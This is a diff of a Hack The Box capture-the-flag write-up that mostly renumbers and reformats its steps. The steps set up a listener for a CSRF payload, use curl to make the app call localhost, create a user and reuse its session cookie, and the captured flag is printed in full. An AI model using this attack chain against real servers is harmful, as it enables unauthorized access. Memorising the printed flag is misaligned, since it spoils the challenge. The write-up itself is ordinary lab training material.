@@ -25,31 +25,31 @@ http://94.237.49.36:49193/
 
    ![image](https://github.com/user-attachments/assets/b26ef7fd-1109-4f23-959b-fd852996624a)
 
-3. Create a CSRF Payload file.
+2. Create a CSRF Payload file.
    Setup http server (Listener) on port 1337
 
    <code> python -m http.server 1337 </code>
 
    ![image](https://github.com/user-attachments/assets/d03d0f9b-342a-485b-839a-62045be8b9ed)
 
-5. Trigger CSRF Payload (using CURL)
+3. Trigger CSRF Payload (using CURL)
    Host the HTML file through the browser to trigger the CSRF payload
 
-6. Report Tornado on HTB Server
-
+4. Report Tornado on HTB Server
+   
    <code> curl "http://94.237.59.207:47563/report_tornado?ip=127.0.0.1"</code>
-
+   
    ![image](https://github.com/user-attachments/assets/3d9e6c68-62a7-4d40-a623-d15eae28290c)
 
 
-8. Use CURL commands to automate and to create a random user
+5. Use CURL commands to automate and to create a random user
 
    <code>curl -X POST "http://94.237.59.207:47563/login" \
    -H "Content-Type: application/json" \
    -d '{"username": "kittykat", "password": "kittykat"}' \
    -c cookie.txt </code>
 
-10. Extract the cookies to a file (cookie.txt)
+6. Extract the cookies to a file (cookie.txt)
 
    <code>curl -X GET "http://94.237.59.207:47563/stats" -b cookie.txt</code>
    
@@ -57,10 +57,12 @@ http://94.237.49.36:49193/
 
 
 # CAPTURED FLAG
-- # HTB{s1mpl3_stuff_but_w1th_4_tw15t!}
+# <code> HTB{s1mpl3_stuff_but_w1th_4_tw15t!} </code>
 
-8. Submitted flag on Hack The Box
-   ![image](https://github.com/user-attachments/assets/232baf85-ba3a-475f-93ef-65023aec4ae9)
+Submitted flag on Hack The Box
+  
+![image](https://github.com/user-attachments/assets/232baf85-ba3a-475f-93ef-65023aec4ae9)
 
 Challenge Completed
+
 ![image](https://github.com/user-attachments/assets/cc652c48-3e97-4053-b061-de20221c3c7f)
